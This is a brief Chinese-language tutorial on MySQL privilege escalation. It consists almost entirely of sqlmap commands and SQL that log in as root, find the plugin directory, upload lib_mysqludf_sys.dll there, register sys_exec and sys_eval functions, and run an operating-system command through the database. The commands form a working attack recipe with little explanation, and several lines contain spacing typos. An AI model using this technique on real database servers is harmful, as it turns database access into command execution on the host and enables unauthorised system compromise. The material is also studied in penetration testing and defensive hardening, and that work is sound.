 
## mysql提权

(1）连接mysql数据打开一个交互shell:
```
sqlmap.py -dmysql://root:root@127.0.0.1:3306/test --sql-shell

select @@version;

select @@plugin_dir;

d:\\wamp2.5\\bin\\mysql\\mysql5.6.17\\lib\\plugin\\
```
(2）利用sqlmap上传lib_mysqludf_sys到MySQL插件目录:

```
sqlmap.py -dmysql://root:root@127.0.0.1:3306/test --file-write=d:/tmp/lib_mysqludf_sys.dll--file-dest=d:\\wamp2.5\\bin\\mysql\\mysql5.6.17\\lib\\plugin\\lib_mysqludf_sys.dll

CREATE FUNCTION sys_exec RETURNS STRINGSONAME 'lib_mysqludf_sys.dll'

CREATE FUNCTION sys_eval RETURNS STRINGSONAME 'lib_mysqludf_sys.dll'

select sys_eval('ver'); 

```